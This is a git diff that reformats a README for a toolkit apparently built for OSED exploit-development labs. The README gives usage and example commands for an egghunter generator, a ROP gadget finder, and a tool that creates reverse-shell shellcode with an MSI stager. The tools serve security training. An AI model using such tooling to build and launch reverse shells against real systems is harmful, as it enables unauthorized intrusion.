@@ -27,7 +27,7 @@ pip3 install keystone-engine numpy
 
 ### Usage
 
-````bash
+```bash
 usage: egghunter.py [-h] [-t TAG] [-b BAD_CHARS [BAD_CHARS ...]] [-s]
 
 Creates an egghunter compatible with the OSED lab VM
@@ -38,9 +38,10 @@ optional arguments:
   -b BAD_CHARS [BAD_CHARS ...], --bad-chars BAD_CHARS [BAD_CHARS ...]
                         space separated list of bad chars to check for in final egghunter (default: 00)
   -s, --seh             create an seh based egghunter instead of NtAccessCheckAndAuditAlarm
+```
 
-
-Example Usage:
+#### Examples
+```bash
 ./egghunter.py                              # generate default egghunter
 ./egghunter.py --tag w00t                   # generate egghunter with w00tw00t tag
 ./egghunter.py -b 00 0a 25 26 3d --seh      # generate SEH-based egghunter while checking for bad characters (does not alter the shellcode, that's to be done manually)
@@ -51,13 +52,13 @@ Finds and categorizes useful gadgets. Only prints to terminal the cleanest gadge
 
 ### Install
 
-````bash
+```bash
 pip3 install rich ropper
 `````
 
 ### Usage
 
-````bash
+```bash
 usage: find-gadgets.py [-h] -f FILES [FILES ...] [-b BAD_CHARS [BAD_CHARS ...]] [-o OUTPUT]
 
 Searches for clean, categorized gadgets from a given list of files
@@ -70,8 +71,10 @@ optional arguments:
                         space separated list of bad chars to omit from gadgets, e.g., 00 0a (default: empty)
   -o OUTPUT, --output OUTPUT
                         name of output file where all (uncategorized) gadgets are written (default: found-gadgets.txt)
+```
 
-Example Usage:
+#### Examples
+```bash
 ./find-gadgets.py -f libeay32ibm019.dll     # search gadgets in one file
 ./find-gadgets.py -f libeay32ibm019.dll -s  # skip rp++ enrichment (only use ropper)
 ./find-gadgets.py -f a.dll b.dll -b 00 0a   # search gadgets in multiple files
@@ -82,11 +85,12 @@ Example Usage:
 ## Shellcoder
 Creates reverse shell with optional msi loader
 
-````bash
+```bash
 usage: shellcode.py [-h] [-l LHOST] [-p LPORT] [-b BAD_CHARS [BAD_CHARS ...]] [-m] [-d] [-t] [-s]
 
 Creates shellcodes compatible with the OSED lab VM
 
+### Usage
 optional arguments:
   -h, --help            show this help message and exit
   -l LHOST, --lhost LHOST
@@ -100,10 +104,12 @@ optional arguments:
   -t, --test-shellcode  test the shellcode on the system
   -s, --store-shellcode
                         store the shellcode in binary format in the file shellcode.bin
+```
 
-Example Usage:
+#### Examples
+```bash
 python3 shellcode.py                            # generate a reverse shell payload (defaults: 127.0.0.1:4444)
 python3 shellcode.py -l 127.0.0.1 -p 3333       # generate a reverse shell for specific listener
 python3 shellcode.py --msi -l 127.0.0.1 -s      # generate MSI stager and store raw bytes
 python3 shellcoder.py -t                        # test-run the shellcode (only works when run from 32-bit Python environment)
-````
+```
